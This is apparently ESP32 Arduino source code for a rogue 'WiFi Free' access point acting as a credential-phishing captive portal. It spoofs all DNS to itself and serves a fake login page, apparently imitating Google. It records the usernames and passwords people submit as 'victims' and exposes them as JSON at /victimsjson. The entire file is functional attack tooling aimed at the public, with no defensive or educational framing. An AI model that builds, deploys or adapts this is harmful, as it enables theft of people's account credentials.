#include <Arduino.h>
#include <WiFiMulti.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "SPIFFS.h"
#include "Victims.cpp"

// User configuration
const char* SSID_NAME = "WiFi Free";

//System Settings
const byte DNS_PORT = 53;
const int TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway


unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);
Victims *victims;


String input(String argName) {
    String a = webServer.arg(argName);
    a.replace("<", "&lt;");
    a.replace(">", "&gt;");
    a.substring(0, 200);
    return a;
}


void posted() {
    String username = input("username");
    String password = input("password");
    victims->addVictim(username, password);
}


void clear() {
    victims->clearVictims();
}


void handleFileRequest(String path) {
    if (path == "/") path = "/index.html";
    String contentType = "text/plain";
    
    if (path.endsWith(".html")) contentType = "text/html";
    else if (path.endsWith(".css")) contentType = "text/css";
    else if (path.endsWith(".js")) contentType = "application/javascript";
    else if (path.endsWith(".svg")) contentType = "image/svg+xml";
    
    File file = SPIFFS.open(path, FILE_READ);
    if (!file) {
        webServer.send(404, "text/plain", "Arquivo não encontrado");
        return;
    }

    webServer.streamFile(file, contentType);
    file.close();
}


void setup() {
    Serial.begin(9600);
    bootTime = lastActivity = millis();

    WiFi.mode(WIFI_AP_STA); // Use both AP and STA modes
    WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(SSID_NAME);

    dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
    
    
    webServer.on("/style.css", []() { handleFileRequest("/style.css"); });
    webServer.on("/script.js", []() { handleFileRequest("/script.js"); });
    webServer.on("/google-icon.svg", []() { handleFileRequest("/google-icon.svg"); });
    
    webServer.on("/", []() { handleFileRequest("/index.html"); });
    
    webServer.on("/pass", []() { handleFileRequest("/pass.html"); });
    
    webServer.on("/clear", []() {
        clear();
        webServer.send(200, "text/plain", "Deletado com sucesso");
    });
    
    webServer.on("/post", []() {
        posted();
        handleFileRequest("/validando.html");
    });

    webServer.on("/victimsjson", []() {
        webServer.send(200, "application/json", victims->getJsonText());
    });

    webServer.onNotFound([]() {
        lastActivity = millis();
        handleFileRequest("/index.html");
    });

    webServer.begin();

    victims = new Victims();
}

void loop() {
    if ((millis() - lastTick) > TICK_TIMER) {
        lastTick = millis();
    }
    dnsServer.processNextRequest();
    webServer.handleClient();
}
